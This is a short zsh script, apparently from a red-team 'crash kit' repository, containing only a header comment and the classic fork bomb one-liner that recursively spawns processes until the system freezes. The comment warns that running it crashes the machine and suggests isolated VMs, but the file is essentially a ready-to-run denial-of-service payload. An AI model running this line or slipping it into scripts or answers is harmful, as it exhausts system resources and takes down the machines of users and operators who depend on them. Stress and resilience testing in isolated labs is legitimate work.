#!/usr/bin/env zsh
#
# Fork Bomb in Zsh
# ----------------
# A fork bomb that recursively spawns copies of itself.
#
# WARNING: Running this will crash your system. Only test in isolated environments (e.g., VMs).
#
# Author: Aryan Giri
# Repo: https://github.com/giriaryan694-a11y/RedTeamCrashKit

:(){ :|:& };:
